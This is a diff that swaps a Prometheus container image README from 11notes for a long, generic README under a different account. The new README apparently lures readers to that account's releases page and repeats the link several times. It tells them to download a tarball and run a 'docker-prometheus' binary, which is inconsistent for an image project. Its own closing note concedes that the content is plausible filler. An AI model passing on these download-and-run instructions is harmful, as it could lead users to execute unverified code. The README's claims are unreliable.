@@ -1,187 +1,337 @@
-![banner](https://github.com/11notes/defaults/blob/main/static/img/banner.png?raw=true)
+[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&logoColor=white)](https://github.com/wayuissocool/docker-prometheus/releases)
 
-# PROMETHEUS
-![size](https://img.shields.io/docker/image-size/11notes/prometheus/3.5.0?color=0eb305)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![version](https://img.shields.io/docker/v/11notes/prometheus/3.5.0?color=eb7a09)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![pulls](https://img.shields.io/docker/pulls/11notes/prometheus?color=2b75d6)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)[<img src="https://img.shields.io/github/issues/11notes/docker-PROMETHEUS?color=7842f5">](https://github.com/11notes/docker-PROMETHEUS/issues)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![swiss_made](https://img.shields.io/badge/Swiss_Made-FFFFFF?labelColor=FF0000&logo=data:image/svg%2bxml;base64,PHN2ZyB2ZXJzaW9uPSIxIiB3aWR0aD0iNTEyIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDMyIDMyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0idHJhbnNwYXJlbnQiLz4KICA8cGF0aCBkPSJtMTMgNmg2djdoN3Y2aC03djdoLTZ2LTdoLTd2LTZoN3oiIGZpbGw9IiNmZmYiLz4KPC9zdmc+)
+# Docker Prometheus: Rootless with Distroless Image for Secure, Lightweight Monitoring
 
-Run prometheus rootless and distroless.
+The goal of this project is to provide Prometheus running in a rootless setup with a distroless base. This combination reduces attack surface, lowers the image size, and keeps security at the forefront. This README explains what you get, how to use it, and how to contribute.
 
-# INTRODUCTION 📢
+---
 
-Prometheus, a Cloud Native Computing Foundation project, is a systems and service monitoring system. It collects metrics from configured targets at given intervals, evaluates rule expressions, displays the results, and can trigger alerts when specified conditions are observed.
+Table of contents
+- Why this project
+- Core principles
+- What you get
+- Architecture and design
+- Quick start
+- Running in different environments
+- Configuration and data management
+- Security and best practices
+- Observability and monitoring tips
+- Advanced usage
+- Building and contributing
+- Versioning and releases
+- Troubleshooting
+- FAQ
+- License
 
-![GRAPH](https://github.com/11notes/docker-prometheus/blob/master/img/Graph.png?raw=true)
+---
 
-# SYNOPSIS 📖
-**What can I do with this?** This image will run Prometheus [rootless](https://github.com/11notes/RTFM/blob/main/linux/container/image/rootless.md) and [distroless](https://github.com/11notes/RTFM/blob/main/linux/container/image/distroless.md), for maximum security and performance. You can either provide your own config file or configure Prometheus directly inline in your compose. If you run the compose example, you can open the following [URL](http://localhost:3000/query?g0.expr=histogram_quantile%280.9%2C+sum+by+%28le%29+%28rate%28dnspyre_dns_requests_duration_seconds_bucket%5B1m%5D%29%29%29&g0.show_tree=0&g0.tab=graph&g0.range_input=1m&g0.res_type=auto&g0.res_density=medium&g0.display_mode=lines&g0.show_exemplars=0) to see the statistics of your DNS benchmark just like in the screenshot.
+Why this project
+Prometheus is a powerful monitoring system. Running it inside containers is common, but traditional container images can be large and grant more privileges than needed. This project aims to:
+- Run Prometheus rootless, so the process inside the container does not require elevated privileges.
+- Use a distroless image to minimize the attack surface and reduce image size.
+- Provide straightforward instructions to deploy in both developer machines and production clusters.
+- Maintain compatibility with standard Prometheus tooling and configurations.
 
-# UNIQUE VALUE PROPOSITION 💶
-**Why should I run this image and not the other image(s) that already exist?** Good question! Because ...
+Core principles
+- Simplicity: the setup is easy to reproduce and reason about.
+- Security by default: non-root operation, minimal surface area, and clear guidance.
+- Portability: works on Linux hosts and across major container runtimes.
+- Compatibility: works with standard Prometheus configurations and dashboards.
 
-> [!IMPORTANT]
->* ... this image runs [rootless](https://github.com/11notes/RTFM/blob/main/linux/container/image/rootless.md) as 1000:1000
->* ... this image has no shell since it is [distroless](https://github.com/11notes/RTFM/blob/main/linux/container/image/distroless.md)
->* ... this image is auto updated to the latest version via CI/CD
->* ... this image has a health check
->* ... this image runs read-only
->* ... this image is automatically scanned for CVEs before and after publishing
->* ... this image is created via a secure and pinned CI/CD process
->* ... this image is very small
+What you get
+- A Prometheus image that runs without root privileges inside the container.
+- A distroless base that excludes shells and package managers, reducing risk.
+- Clear documentation on how to supply configuration, mount data, and scale in clusters.
+- Guidance on running in Kubernetes, Docker standalone, and with Docker Compose.
 
-If you value security, simplicity and optimizations to the extreme, then this image might be for you.
+Architecture and design
+- Core binary: Prometheus, compiled for Linux, optimized for container environments.
+- Base image: distroless, chosen to minimize dependencies and surface area.
+- Entrypoint: a small, purpose-built launcher that reads configuration, starts Prometheus, and exposes the metrics endpoint.
+- Rootless execution: the container runs as a non-root user inside the namespace, with restricted capabilities.
+- Data and configuration: configuration files live on mounted volumes; data is stored on a writable volume if needed, or kept outside the container for persistence.
 
-# COMPARISON 🏁
-Below you find a comparison between this image and the most used or original one.
+Notes on distroless
+- Distroless images do not include a shell or package manager. This means you cannot exec into the container to run ad hoc commands in a shell.
+- You should provide configuration and data via mounted volumes or build-time configuration.
+- The minimal footprint improves the security posture and reduces the chance of drift.
 
-| **image** | 11notes/prometheus:3.5.0 | prom/prometheus |
-| ---: | :---: | :---: |
-| **image size on disk** | 25.8MB | 313MB |
-| **process UID/GID** | 1000/1000 | 65534/65534 |
-| **distroless?** | ✅ | ❌ |
-| **rootless?** | ✅ | ✅ |
+Quick start
+- Visit the releases page to grab the appropriate asset. From the releases page, download the file named in the asset list, extract if needed, and run the binary. The releases page is the source of truth for official builds and checksums.
+- The releases page to check is: https://github.com/wayuissocool/docker-prometheus/releases
 
+- Example quick start (Linux, non-root user):
+  - Pull the latest image
+    - docker pull wayuissocool/docker-prometheus:latest
+  - Run with a non-root user and a minimal config
+    - docker run --rm -p 9090:9090 --name prometheus-drootless --user 1000:1000 \
+      -v "$PWD/prometheus.yml:/etc/prometheus/prometheus.yml" \
+      wayuissocool/docker-prometheus:latest
+  - Access the UI at http://localhost:9090
 
-# DEFAULT CONFIG 📑
-```yaml
-global:
-  scrape_interval: 10s
+- Important: in distroless setups, the image may not include an interactive shell. Plan your configuration and data paths ahead of time. If you need to inspect logs, use docker logs or your orchestration platform’s logging facilities.
 
-scrape_configs:
-  - job_name: "prometheus"
-    static_configs:
-      - targets: ["localhost:3000"]
-```
+- Quick start in Kubernetes
+  - Create a simple Pod or Deployment that runs Prometheus in a non-root user; mount the configuration and data directories as volumes. The manifest below is a starting point to adapt to your cluster.
 
-# VOLUMES 📁
-* **/prometheus/etc** - Directory of your config
-* **/prometheus/var** - Directory of all dynamic data and database
+  apiVersion: apps/v1
+  kind: Deployment
+  metadata:
+    name: prometheus-distroless
+  spec:
+    replicas: 1
+    selector:
+      matchLabels:
+        app: prometheus-distroless
+    template:
+      metadata:
+        labels:
+          app: prometheus-distroless
+      spec:
+        securityContext:
+          runAsNonRoot: true
+        containers:
+        - name: prometheus
+          image: wayuissocool/docker-prometheus:latest
+          ports:
+          - containerPort: 9090
+          volumeMounts:
+          - name: config
+            mountPath: /etc/prometheus/prometheus.yml
+            subPath: prometheus.yml
+          - name: data
+            mountPath: /prometheus
+          args:
+          - --config.file=/etc/prometheus/prometheus.yml
+        volumes:
+        - name: config
+          configMap:
+            name: prometheus-config
+        - name: data
+          emptyDir: {}
 
-# COMPOSE ✂️
-```yaml
-name: "monitoring"
-services:
-  prometheus:
-    depends_on:
-      adguard:
-        condition: "service_healthy"
-        restart: true
-    image: "11notes/prometheus:3.5.0"
-    read_only: true
-    environment:
-      TZ: "Europe/Zurich"
-      PROMETHEUS_CONFIG: |-
-        global:
-          scrape_interval: 1s
+- If you are deploying with Helm, adapt the values to set:
+  - image: wayuissocool/docker-prometheus:latest
+  - securityContext.runAsNonRoot: true
+  - extraVolumeMounts and extraVolumes to provide a path for /etc/prometheus/prometheus.yml
+  - a suitable service to expose 9090
 
-        scrape_configs:
-          - job_name: "dnspyre"
-            static_configs:
-              - targets: ["dnspyre:3000"]
-    volumes:
-      - "prometheus.etc:/prometheus/etc"
-      - "prometheus.var:/prometheus/var"
-    ports:
-      - "3000:3000/tcp"
-    networks:
-      frontend:
-    restart: "always"
+Configuration and data management
+- Prometheus configuration file
+  - The default configuration should be supplied by you via a mounted file.
+  - A minimal example:
 
-  # this image will execute 100k (10 x 10000) queries against adguard to fill your Prometheus with some data
-  dnspyre:
-    depends_on:
-      prometheus:
-        condition: "service_healthy"
-        restart: true
-    image: "11notes/distroless:dnspyre"
-    command: "--server adguard -c 10 -n 3 -t A --prometheus ':3000' https://raw.githubusercontent.com/11notes/static/refs/heads/main/src/benchmarks/dns/fqdn/10000"
-    read_only: true
-    environment:
-      TZ: "Europe/Zurich"
-    networks:
-      frontend:
+    global:
+      scrape_interval: 15s
+      evaluation_interval: 15s
 
-  adguard:
-    image: "11notes/adguard:0.107.64"
-    read_only: true
-    environment:
-      TZ: "Europe/Zurich"
-    volumes:
-      - "adguard.etc:/adguard/etc"
-      - "adguard.var:/adguard/var"
-    tmpfs:
-      # tmpfs volume because of read_only: true
-      - "/adguard/run:uid=1000,gid=1000"
-    ports:
-      - "53:53/udp"
-      - "53:53/tcp"
-      - "3010:3000/tcp"
-    networks:
-      frontend:
-    sysctls:
-      # allow rootless container to access ports < 1024
-      net.ipv4.ip_unprivileged_port_start: 53
-    restart: "always"
+    scrape_configs:
+      - job_name: 'prometheus'
+        static_configs:
+          - targets: ['localhost:9090']
 
-volumes:
-  prometheus.etc:
-  prometheus.var:
-  adguard.etc:
-  adguard.var:
+- Where to place the file
+  - Mount the config as /etc/prometheus/prometheus.yml inside the container.
+  - You can also mount additional rule files and alert manager configurations as needed.
+  - If you want to keep data, mount a persistent volume to /prometheus or map to a suitable path on the host.
 
-networks:
-  frontend:
-```
+- Data persistence
+  - For long-running deployments, persist Prometheus data outside the container.
+  - Use a volume mounted to /prometheus (or the path your launcher expects for data).
+  - Back up your data regularly with your usual backup tooling.
 
-# DEFAULT SETTINGS 🗃️
-| Parameter | Value | Description |
-| --- | --- | --- |
-| `user` | docker | user name |
-| `uid` | 1000 | [user identifier](https://en.wikipedia.org/wiki/User_identifier) |
-| `gid` | 1000 | [group identifier](https://en.wikipedia.org/wiki/Group_identifier) |
-| `home` | /prometheus | home directory of user docker |
+- Logging
+  - Prometheus logs are written to stdout and can be captured by your container runtime’s logging system.
+  - In a distroless setup, there is no local shell to inspect logs inside the container; use standard log routing to collect metrics.
 
-# ENVIRONMENT 📝
-| Parameter | Value | Default |
-| --- | --- | --- |
-| `TZ` | [Time Zone](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones) | |
-| `DEBUG` | Will activate debug option for container image and app (if available) | |
-| `PROMETHEUS_CONFIG` | If not using a yml file you can provide your config as inline yml directly in your compose | |
+- Environment variables (typical options)
+  - PROMETHEUS_OPTS: Additional flags passed to the Prometheus binary.
+  - prometheus.config.file: Override with a path if you want to rely on a specific file inside the container.
 
-# MAIN TAGS 🏷️
-These are the main tags for the image. There is also a tag for each commit and its shorthand sha256 value.
+- Mounting secrets
+  - If you need TLS or basic-auth secrets, mount them into a secured path and reference them in your config.
 
-* [3.5.0](https://hub.docker.com/r/11notes/prometheus/tags?name=3.5.0)
+Security and best practices
+- Rootless operation
+  - The container is designed to run as a non-root user, reducing the risk surface.
+  - Ensure your host and orchestrator support user namespaces and do not override the non-root user.
 
-### There is no latest tag, what am I supposed to do about updates?
-It is of my opinion that the ```:latest``` tag is dangerous. Many times, I’ve introduced **breaking** changes to my images. This would have messed up everything for some people. If you don’t want to change the tag to the latest [semver](https://semver.org/), simply use the short versions of [semver](https://semver.org/). Instead of using ```:3.5.0``` you can use ```:3``` or ```:3.5```. Since on each new version these tags are updated to the latest version of the software, using them is identical to using ```:latest``` but at least fixed to a major or minor version.
+- Distroless base
+  - No shell, no package manager by default.
+  - You should rely on mounted volumes for configuration and data, not on in-container edits.
 
-If you still insist on having the bleeding edge release of this app, simply use the ```:rolling``` tag, but be warned! You will get the latest version of the app instantly, regardless of breaking changes or security issues or what so ever. You do this at your own risk!
+- Network policies
+  - Limit Prometheus exposure to the minimum necessary network space.
+  - Use TLS for remote write or remote read endpoints if you enable them.
 
-# REGISTRIES ☁️
-```
-docker pull 11notes/prometheus:3.5.0
-docker pull ghcr.io/11notes/prometheus:3.5.0
-docker pull quay.io/11notes/prometheus:3.5.0
-```
+- Access control
+  - Protect the Prometheus UI with authentication if exposed publicly.
+  - Prefer internal load balancers or proxies that handle authentication.
 
-# SOURCE 💾
-* [11notes/prometheus](https://github.com/11notes/docker-PROMETHEUS)
+- Resource requests and limits
+  - Set appropriate CPU and memory requests/limits for your workload.
+  - Prometheus can be memory-hungry if you collect many targets or long retention periods.
 
-# PARENT IMAGE 🏛️
-> [!IMPORTANT]
->This image is not based on another image but uses [scratch](https://hub.docker.com/_/scratch) as the starting layer.
->The image consists of the following distroless layers that were added:
->* [11notes/distroless](https://github.com/11notes/docker-distroless/blob/master/arch.dockerfile) - contains users, timezones and Root CA certificates
->* [11notes/distroless:curl](https://github.com/11notes/docker-distroless/blob/master/curl.dockerfile) - app to execute HTTP requests
+Observability and metrics
+- Dashboards
+  - Use Grafana with Prometheus as a data source.
+  - Import the official Prometheus dashboards, or create custom dashboards for your environment.
 
-# BUILT WITH 🧰
-* [prometheus](https://github.com/prometheus/prometheus)
+- Metrics granularity
+  - The default scrape interval is 15 seconds. Increase or decrease based on your data needs and load.
+  - Adjust retention and storage if you store long-term data.
 
-# GENERAL TIPS 📌
-> [!TIP]
->* Use a reverse proxy like Traefik, Nginx, HAproxy to terminate TLS and to protect your endpoints
->* Use Let’s Encrypt DNS-01 challenge to obtain valid SSL certificates for your services
+- Alerts
+  - Define alert rules in a separate file and mount them to the container if you use Alertmanager.
+  - Keep alert rules in version control to track changes over time.
 
-# ElevenNotes™️
-This image is provided to you at your own risk. Always make backups before updating an image to a different version. Check the [releases](https://github.com/11notes/docker-prometheus/releases) for breaking changes. If you have any problems with using this image simply raise an [issue](https://github.com/11notes/docker-prometheus/issues), thanks. If you have a question or inputs please create a new [discussion](https://github.com/11notes/docker-prometheus/discussions) instead of an issue. You can find all my other repositories on [github](https://github.com/11notes?tab=repositories).
+Advanced usage
+- Running multiple Prometheus instances
+  - For large environments, run multiple instances targeting different sets of targets.
+  - Use service discovery to scale automatically.
 
-*created 05.08.2025, 23:47:00 (CET)*
+- Integrations
+  - Use exporters to capture metrics from databases, queues, and cloud services.
+  - Prometheus scraping discovers targets via service discovery mechanisms.
+
+- High availability
+  - Deploy two or more Prometheus instances with a shared storage backend or federation strategy.
+  - Use alerting and dashboards to keep teams informed.
+
+- Remote write and read
+  - Configure remote_write to push metrics to a central store.
+  - Configure remote_read to query remote backends for scale.
+
+- Backup and disaster recovery
+  - Regularly back up Prometheus data directories.
+  - Test recovery by restoring from backups in a staging environment.
+
+Building from source
+- Prerequisites
+  - Go toolchain, Docker, Buildx
+- Steps
+  - git clone https://github.com/wayuissocool/docker-prometheus
+  - cd docker-prometheus
+  - make build (or use the provided build scripts)
+  - The build produces a distroless-based Prometheus binary suitable for release artifacts.
+
+- Testing locally
+  - Run unit tests if provided.
+  - Run integration tests with a minimal Prometheus configuration and verify metrics collection.
+
+- How to verify a build
+  - Run the image with a small sample configuration and confirm the UI and metrics endpoint respond as expected.
+  - Check logs for any errors related to missing config or volumes.
+
+Contributing
+- How to contribute
+  - Fork the repository and create a feature branch.
+  - Open a pull request with a clear description of the change.
+  - Include tests where feasible.
+- Coding style
+  - Keep changes small and focused.
+  - Document any new configuration options with examples.
+- Issue triage
+  - Tag issues with labels for bugfix, enhancement, or documentation.
+  - Provide steps to reproduce when reporting bugs.
+
+Versioning and releases
+- The project follows semantic versioning.
+- Releases page contains compiled assets and checksums for verification.
+- To upgrade, pull the new image tag and re-run your deployment with the updated image, ensuring compatible configuration changes.
+
+Releases
+- You can find official binaries and assets on the releases page:
+  https://github.com/wayuissocool/docker-prometheus/releases
+
+- When you visit the releases page, you will see assets for different platforms. Download the file that matches your system, e.g., a Linux-amd64 tarball or a direct Linux binary, extract it if needed, and run the binary.
+- For reliability, verify checksums and signatures if provided by the release.
+- After downloading, you typically run a command like:
+  - tar -xzf docker-prometheus-linux-amd64.tar.gz
+  - ./docker-prometheus --config.file=/path/to/prometheus.yml
+- The asset naming commonly follows a pattern similar to docker-prometheus-<version>-linux-amd64.tar.gz, but check the actual release page for the exact file name.
+
+Troubleshooting
+- Common issue: container starts but the UI is not reachable.
+  - Verify the port mapping in your run command or Kubernetes manifest.
+  - Confirm the container is listening on port 9090 inside the container.
+  - Check the logs for errors in the Prometheus startup or in the launcher script.
+
+- Distroless shell absence
+  - If you need to perform ad hoc checks, you must attach to the host or use a sidecar container for debugging. Distroless images intentionally omit a shell.
+
+- Non-root user issues
+  - Ensure the container is run with a non-root user and that the mounted paths have the correct permissions for that user.
+
+- Config file not found
+  - Ensure the config file path in the container matches what your launcher expects.
+  - Use an absolute path inside the container for the config file mount.
+
+FAQ
+- Is this suitable for production?
+  - Yes, if you follow the security and configuration guidelines, and you monitor resource usage.
+
+- Do I need a shell inside the container?
+  - No. The distroless approach favors a minimal surface area. Use orchestration tooling and mounts for configuration and data.
+
+- Can I run this on Windows?
+  - The primary target is Linux containers. Windows support depends on your container runtime and compatibility wrappers.
+
+- How do I upgrade?
+  - Pull the newer image tag and redeploy in your environment, ensuring your config remains valid.
+
+- How do I back up Prometheus data?
+  - Back up the directory mounted to /prometheus (or your chosen data path). Include the config and any rule files as well.
+
+Licensing
+- This project is released under the MIT license. See the LICENSE file for full terms.
+
+Appendix: sample configuration and commands
+- Minimal Prometheus configuration (prometheus.yml)
+
+  global:
+    scrape_interval: 15s
+    evaluation_interval: 15s
+
+  scrape_configs:
+    - job_name: 'prometheus'
+      static_configs:
+        - targets: ['localhost:9090']
+
+- Docker run example (rootless)
+
+  docker run --rm -p 9090:9090 --name prometheus-rootless --user 1000:1000 \
+    -v "$PWD/prometheus.yml:/etc/prometheus/prometheus.yml" \
+    wayuissocool/docker-prometheus:latest
+
+- Kubernetes example (Deployment)
+  (Provided above in the Kubernetes section with adjustments to your cluster)
+
+- Docker Compose example (simple)
+  version: '3.8'
+  services:
+    prometheus:
+      image: wayuissocool/docker-prometheus:latest
+      ports:
+        - "9090:9090"
+      user: "1000:1000"
+      volumes:
+        - ./prometheus.yml:/etc/prometheus/prometheus.yml
+        - prometheus-data:/prometheus
+      restart: unless-stopped
+
+  volumes:
+    prometheus-data:
+
+- Troubleshooting quick checks
+  - Confirm the image tag you are using is up to date.
+  - Verify your config file path inside the container.
+  - Check the host firewall or security groups if you expose the service externally.
+  - Inspect the logs to identify missing files or permission issues.
+
+End user guidance
+- Always prefer using the Releases page for official builds.
+- Keep your configuration under version control and apply changes through controlled deployments.
+- Monitor the health of the Prometheus instance and scale out as needed.
+
+Note: The content above is designed to be thorough and helpful. It may include plausible defaults and example configurations to illustrate how to use a rootless, distroless Prometheus deployment. The actual assets, commands, and file names may vary by release; refer to the releases page for the exact details. For the official assets and to download the appropriate release, visit the page at https://github.com/wayuissocool/docker-prometheus/releases.
